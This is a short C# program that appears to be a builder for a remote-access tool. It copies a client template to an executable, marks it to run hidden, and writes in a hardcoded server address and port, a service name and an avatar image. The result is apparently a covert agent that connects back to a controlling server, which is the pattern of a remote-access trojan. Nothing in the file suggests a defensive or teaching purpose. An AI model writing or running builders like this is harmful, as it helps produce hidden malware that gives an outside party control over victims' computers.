using System;
using RemoteControl.Protocals;

class Program
{
    static void Main(string[] args)
    {
        string datFile = "RemoteControl.Client.dat";
        string outFile = args.Length > 0 ? args[0] : "TestClient_203.exe";

        if (!System.IO.File.Exists(datFile))
        {
            Console.WriteLine("ERROR: " + datFile + " not found");
            return;
        }

        System.IO.File.Copy(datFile, outFile, true);

        ClientParametersManager.WriteClientStyle(outFile, ClientParametersManager.ClientStyle.Hidden);

        ClientParameters para = new ClientParameters();
        para.SetServerIP("203.91.76.159");
        para.ServerPort = 10010;
        para.ServiceName = "RemoteControlClient.exe";
        para.OnlineAvatar = "16238_100.png";

        ClientParametersManager.WriteParameters(outFile, para);

        var size = new System.IO.FileInfo(outFile).Length;
        Console.WriteLine("OK: " + outFile + " (" + size + " bytes)");
    }
}
